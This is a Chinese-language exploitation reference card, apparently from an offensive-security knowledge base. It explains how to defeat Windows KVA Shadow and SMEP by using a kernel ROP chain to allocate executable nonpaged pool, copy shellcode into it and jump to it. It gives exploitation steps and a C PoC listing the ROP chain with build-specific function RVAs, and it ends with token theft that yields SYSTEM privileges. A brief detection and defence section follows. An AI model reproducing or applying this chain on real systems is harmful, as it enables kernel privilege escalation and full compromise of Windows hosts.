---
id: binary-pwn-kernel-windows-kvas-nonpaged-pool-executable-shellcode-rop
title: KVA Shadow 下绕过用户页 NX：ROP 调 ExAllocatePoolWithTag 分配可执行非分页池 + RtlCopyMemory 复制 shellcode 并 jmp rax
type: scenario
domain: binary
path: binary/pwn/kernel
technique: windows-kvas-bypass-nonpaged-pool-executable-shellcode
tags:
- windows
- kernel
- pwn
- kvas
- kva-shadow
- smep
- nonpaged-pool
- rop
- shellcode
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V594
  verified_at: '2026-11-12T15:35:46+08:00'
  notes: 已对照原文及截图核对：ExAllocatePoolWithTag(0,0x100,0xDEAD) 的 NonPagedPoolExecute=0、RtlCopyMemory 解析为 memmove、RVA base+0x9B203F（导出表 0x9B2030+0xF 跳到 push rdi 跳过三条 mov 保存序言）、base+0x40BEC0、mov dword ptr [rsp+68h],ebx 清低 32 位后重复 pop rdx/shellcode 槽位、push rax;push rdi;ret + pop rdi + pop rcx 组合实现 rcx=rax，均与图 41-48 一致；图 49-50 显示 SMEP 开启下成功。与 smep-bypass-cr4-rop 为不同绕过技术链（CR4 清零 vs 内核可执行池），dedup_review 成立。未复跑。
url: /docs/binary/pwn/kernel/binary-pwn-kernel-windows-kvas-nonpaged-pool-executable-shellcode-rop/
draft: false
kb_aliases:
- KVA Shadow 绕过
- KVAS bypass
- Kernel Virtual Address Shadow
- NonPagedPoolExecute
- ExAllocatePoolWithTag shellcode
- RtlCopyMemory ROP
- rcx=rax gadget 链
- Meltdown 缓解绕过
---

## 一句话结论

KVA Shadow 在内核页表中把用户页标记为 NX（叠加 SMEP），ret2usr 的用户态 shellcode 无法在 ring0 执行；改为用内核 ROP 调用 `ExAllocatePoolWithTag(NonPagedPoolExecute=0, 0x100, tag)` 分配内核可执行池内存，再用 `RtlCopyMemory` 把用户态 shellcode 复制进去，最后 `jmp rax` 跳到池中执行，即可在 SMEP 仍开启的情况下拿到 ring0 代码执行。

## 原理

- **KVA Shadow 是什么**：`Kernel Virtual Address Shadow`（KVA Shadow/KVAS）是微软针对 Meltdown（CVE-2017-5754）与 TotalMeltdown（CVE-2018-1038）的缓解。进入内核时切换到一份独立的「内核页表」，其中用户页面虽然仍被映射（用于返回等），但被标记为 NX，防止内核态直接执行用户页代码；内核自身的代码/数据映射保持可执行。
- **为什么 ret2usr 失效**：栈溢出后把返回地址指向用户态 shellcode，即使清掉 CR4.SMEP，CPU 仍会因内核页表中的用户页 NX 而触发页错误；同理，用户页上的 ROP 栈也可能不可用。攻击者需要一段「内核可执行地址」来放代码。
- **内核池可执行**：`ExAllocatePoolWithTag` 的第一个参数 `PoolType` 为 0 时表示 `NonPagedPool`（可执行，`NonPagedPoolExecute = 0`）；返回的内核虚拟地址位于可执行池，KVAS 不把内核池标成 NX。于是把 shellcode 复制到池中执行即可绕过。
- **ROP 调用的参数**：x64 调用约定为 `rcx, rdx, r8, r9`，返回值在 `rax`。`ExAllocatePoolWithTag(PoolType, NumberOfBytes, Tag)` 需要 `rcx=0, rdx=0x100, r8=0xDEAD`；`RtlCopyMemory(dest, src, len)`（实际解析为 `memmove`）需要 `rcx=池地址, rdx=用户 shellcode, r8=长度`。
- **rcx=rax 的 gadget 组合**：调用 `ExAllocatePoolWithTag` 后池地址在 `rax`，但下个函数要从 `rcx` 取 dest。案例用三只 gadget 组合：`pop rdi; ret`（把 `pop rcx` 地址装入 rdi）、`push rax; push rdi; ret`（把 rax 与 rdi 压栈后 ret 到 `pop rcx`）、`pop rcx; ret`（弹出刚压入的 rax 到 rcx）。实际环境中常没有现成的 `mov rcx, rax; ret`，`push rax; push rbx/rdi; ret` 是可移植替代。
- **函数序言的破坏**：`ExAllocatePoolWithTag` 入口有三条 `mov [rsp+arg_0/arg_8/arg_10], rbx/rbp/rsi` 保存寄存器，正好写到 ROP 链占用的栈槽，填这些位置无意义；案例直接跳到序言之后的 `push rdi`。函数体内还有 `mov dword ptr [rsp+68h], ebx`（ebx 已被异或为 0）会清零链上某槽的低 32 位，所以需要按实测栈关系重复放置 `pop rdx`/`shellcode_addr` 槽位，让被清零的那个成为冗余项。
- **为什么最后用 `jmp rax`**：`RtlCopyMemory` 返回后，池地址此前已保存在链上/寄存器中；用 `jmp rax`（或等价 `push rax; ret`）转移控制流，不再依赖已经混乱的栈。
- **收尾**：多次函数调用后 `rsp` 已不可估，池中 shellcode 采用 KTRAP_FRAME 恢复 + `swapgs; sysret` 返回用户态（见关联卡），而不是 `add rsp; ret`。

## 触发条件

- 已控制内核栈/ROP（如内核栈溢出），可以连续布置多条 gadget 并调用内核函数。
- 目标启用 KVA Shadow（Windows 8.1+ 在受 Meltdown 影响的 CPU 上默认开启）；SMEP 可保持开启，本链不依赖关闭 SMEP。
- 已知内核基址与目标 build 的 `ExAllocatePoolWithTag`、`RtlCopyMemory` RVA（案例 Windows 10 19045.2006：`ExAllocatePoolWithTag = base+0x9B203F`，`RtlCopyMemory = base+0x40BEC0`），并确认 `NonPagedPool` 在目标上可执行（非 `NonPagedPoolNx`）。
- 需要可用的 `pop rcx/pop rdx/pop r8/ret` 以及 `push rax; push reg; ret` 类 gadget。
- 若目标启用 SMAP，内核直接读用户源缓冲区可能 fault，需要确认 SMAP 状态或把源放到内核可读内存。

## 利用步骤

1. 泄露 ntoskrnl 基址，计算 gadget 与 `ExAllocatePoolWithTag`/`RtlCopyMemory` 地址。
2. 构造第一段链：`pop rcx; 0`、`pop rdx; 0x100`、`pop r8; 0xDEAD`、`ExAllocatePoolWithTag`。
3. 构造 rcx=rax：`pop rdi; <pop rcx 地址>`、`<push rax; push rdi; ret>`、`pop rcx`。控制流说明：`pop rdi` 后 rdi=pop_rcx 地址，`ret` 到 push 链把池地址压栈、再压 rdi、`ret` 到 pop_rcx，`pop rcx` 取出池地址。
4. 构造复制链：`pop rdx; <user shellcode 地址>`、`pop r8; <长度>`、`RtlCopyMemory`，并对被 `mov dword ptr [rsp+68h], ebx` 清零的槽位做重复布置。
5. 末尾 `jmp rax` 跳到池中 shellcode；shellcode 内做 Token 窃取、特权开启，并以 TrapFrame/sysret 返回用户态。
6. 触发溢出；成功后 `whoami` 为 `nt authority\system`、`whoami /priv` 全部启用，SMEP 仍处于开启状态。

## PoC

案例的链布局（`stackspace+0x818` 为溢出后链起始的实测偏移；偏移与 RVA 仅适用于案例构建）：

```c
typedef unsigned long long u64;
u64 base = ulGetKernelBase("ntoskrnl.exe");
u64 pop_rcx = ..., pop_rdx = ..., pop_r8 = ..., pop_rdi = ...;
u64 push_rax_rdi = ...;                  // push rax; push rdi; ret
u64 ExAllocatePoolWithTag = base + 0x9B203F;
u64 RtlCopyMemory         = base + 0x40BEC0;
u64 jmp_rax = ...;

u64 *p = (u64 *)(stackspace + 0x818);
*p++ = pop_rcx; *p++ = 0;                 // PoolType = NonPagedPoolExecute
*p++ = pop_rdx; *p++ = 0x100;             // NumberOfBytes
*p++ = pop_r8;  *p++ = 0xDEAD;            // Tag
*p++ = ExAllocatePoolWithTag;

*p++ = pop_rdi; *p++ = pop_rcx;           // rdi = pop_rcx 地址
*p++ = push_rax_rdi;                      // 栈: [pool_addr][pop_rcx]，ret 到 pop_rcx
*p++ = pop_rcx;                           // rcx = pool_addr
/* 注意：ExAllocatePoolWithTag 内部会清零某个栈槽低 32 位，
   实际布局需要在 0x50/0x58 之外再重复 0x60/0x68 的 pop_rdx/shellcode_addr */
*p++ = pop_rdx; *p++ = (u64)shellcode;    // src
*p++ = pop_r8;  *p++ = sizeof(cmd);       // len
*p++ = RtlCopyMemory;
*p++ = jmp_rax;                           // 跳到池中的 shellcode
```

池中 shellcode 采用「Token 窃取 + 全部特权启用 + TrapFrame 返回」组合；案例在 Windows 10 19045.2006 上执行成功（`whoami`=`nt authority\system`，全部特权启用），未在本机复跑。gadget 地址、函数 RVA、栈槽偏移均随构建变化。

## 变体与关联

- 关联：[[binary-pwn-kernel-windows-kernel-shellcode-return-trapframe-swapgs-sysret]]（池中 shellcode 的返回方式）。
- 关联：[[binary-pwn-kernel-windows-shellcode-token-steal-eprocess]]、[[binary-pwn-kernel-windows-sep-token-privileges-enable-all]]（池中 shellcode 的载荷内容）。
- 关联：[[binary-pwn-kernel-windows-smep-bypass-cr4-rop]]（KVA Shadow 关闭时清 CR4 后 ret2usr 的简化版；本卡是其绕过变体）。
- 关联：[[binary-pwn-kernel-ntquerysysteminformation-systemmoduleinformation-kernel-base-leak]]（解析函数地址）。
- 变体：把 shellcode 写入其它可执行内核内存（现有可执行池块、可写代码页），减少一次分配；或纯 ROP 完成 Token 读写，不执行任何 shellcode。
- 变体：`rcx=rax` 也可用 `mov rcx, rax; ret`、`xchg rax, rcx; ret` 等 gadget，视目标镜像而定。
- 边界：若目标把非分页池统一改为 NX（`NonPagedPoolNx` 默认化/池 NX 策略），该分配不可执行，需要改用其它可执行内存；PatchGuard 对代码页修改敏感；SMAP 影响用户源缓冲区的直接读取；CFG 不校验 ret 但可能影响间接调用 gadget。

## 检测与防御

- 系统侧：启用 KVA Shadow、SMEP/SMAP、HVCI/内存完整性；对非分页池启用 NX（`NonPagedPoolNx`）并收紧可执行池分配策略。
- 内核侧：监控 `ExAllocatePoolWithTag` 分配可执行池后紧跟 `RtlCopyMemory`/`memmove` 复制与跳转的异常调用序列；EDR 对可执行池分配与内核代码执行做告警。
- 驱动侧：消除栈/池溢出与可控返回地址；开启内核 CFG、/GS，减少 ROP 可用 gadget。
- 应急：出现 BSOD/异常内核执行时，排查最近加载的驱动与设备 IOCTL，隔离主机、轮换凭据。
